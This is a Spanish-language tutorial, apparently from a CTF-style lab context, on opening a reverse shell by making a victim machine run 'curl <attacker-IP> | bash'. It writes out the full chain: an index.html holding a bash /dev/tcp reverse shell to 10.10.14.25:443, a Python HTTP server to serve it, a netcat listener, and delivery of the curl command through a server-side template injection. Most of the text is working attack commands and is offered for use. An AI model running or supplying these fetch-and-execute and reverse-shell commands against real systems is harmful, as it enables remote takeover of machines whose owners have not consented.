# Como establecer una reverse Shell con el comando Curl

En este artículo vamos a ver como establecer una `reverse shell` mediante una petición con `Curl`.

## ¿Qué es Curl?

Curl es un herramienta cuya finalidad es transferir datos a través de una URL. Es un comando disponible en la mayoría de los
sistemas basados en Unix. Es una abreviatura de `Client URL`. Los comandos de Curl están diseñados para funcionar como una forma
de verificar la conectividad a las URL y como una gran herramienta para transferir datos.

![Captura de pantalla 2022-07-21 225432](https://user-images.githubusercontent.com/103068924/180313605-edaba56e-d31d-4c74-bf50-4db5bfa3b27e.png)

* Información más detallada del funcionamiento de Curl --> <a href='https://www.hostinger.es/tutoriales/comando-curl' style="text-decoration:none">Link</a>

# Ejecución:

Para realizar esta opeción lo primero que debemos comprobar es que podamos realizar la petición desde el equipo victima y que este tenga Curl instalado.
Una vez tenemos esto solucionado vamos a ver el funcionamiento de manera básica.

Cuando realizamos una petición con Curl desde la máquina victima:

   curl [Ip de Escucha]
   
   curl 10.10.14.25
   
Y nosotros nos ponemos en escucha desde nuestra terminal, utilizando un servicio http montado con python3 por el puerto 80:

   sudo python3 -m http.server 80

El funcionamiento es el siguiente, cuando Curl realiza una petición a nuestro equipo, estamos realizando una perticion a `http` tratando de conseguir
un `Index.html` (Para poder interpretar la página), aquí es donde viene la trampa.

Lo que nosotros vamos hacer es crear nuestro propio archivo `index.html`, de forma que por dentro tenga los comandos para establecer una reverse shell con bash.
De esta manera cuando realicemos la petición por Curl y le ordenemos ejecutarlo con bash se nos abrira la reverse shell que hayamos establecido.

El archivo `index.html` debe guardarse en el mismo directorio desde donde utilicemos el servicio http. 

# Ejemplo Practico:

Vamos a necesitar tres terminales, una desde donde realizar la petición por Curl desde el equipo victima, una segunda donde utilizaremos el servicio http para 
compartir el archivo `index.html` y una tercera donde nos pondremos en escucha con `netcat` (Aquí recibiremos la reverse shell).

Lo primero que vamos hacer es preparar nuestro archivo `index.html`, creamos una carpeta llamada `shell` independiente para que nos sea más facil:

    sudo mkdit shell
    
    cd shell

Ahora creamos y definimos nuestro archivo `index.html`:

   sudo nano index.html
   
Copiamos y pegamos el siguiente código:

```
#!/bin/bash

bash -i >& /dev/tcp/[Vuestra Ip]/[Puesto de escucha de NetCat] 0>&1

```

Debería de quedar algo así:

```
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.25/443 0>&1
```

Una vez copiado con vuestros datos, guardais (Ctrl x O) y salis (Ctrl + X).

Bien ya tenemos nuestra reverse shell en bash preparada y apuntado al pueto 443. Ahora desde la misma terminal y permaneciendo en el directorio que contenga
el archvio que acabamos de crear vamos a ejecutar el servicio http con python3 para poder compartir el archivo `index.html`.

    sudo python3 -m http.server 80
    
Abrimos nuestra segunda terminal y ponemos a `Netcat` en escucha por el puerto 443:

    sudo nc -lvnp 443
    
Ya tenemos nuestro puerto preparado para recibir la reversehe shell.
    
Finalmente nos dirigimos a la terminal donde estemos en contacto con la victima, es este ejemplo realizare la petición utilizando BurpSuite ejecutando el comando
dentro de un SSTI. Pero básicamente, lo que debemos es realizar la siguiente petición desde el equipo victima:

    curl 10.10.14.25 | bash
    
* `Curl` : Realizara la petición y copiara el archivo index.html desde nuestro servidor creado en python3.
* `bash` : Ordena la ejecución o interpretación del comando definido dentro del archivo, en nuestro caso, estblecer una reverse shell por el puertop 443.

![Captura de pantalla 2022-07-21 231821](https://user-images.githubusercontent.com/103068924/180316903-81849cbf-96b0-4de3-a9f4-c7e0ab2e6610.png)

![Captura de pantalla 2022-07-21 231506](https://user-images.githubusercontent.com/103068924/180316657-1d03c885-ca4e-41b2-b55d-23f1a8e55b59.png)

Como podeís ver el comando Curl esta dentro de la injeccion SSTI, de tal forma que ya solo quedaria enviar la petición.

Tras ejecutar este ultimo comando se nos tendría que haber abierto una shell en la terminal por la que estabamos en ecucha con NetCat.



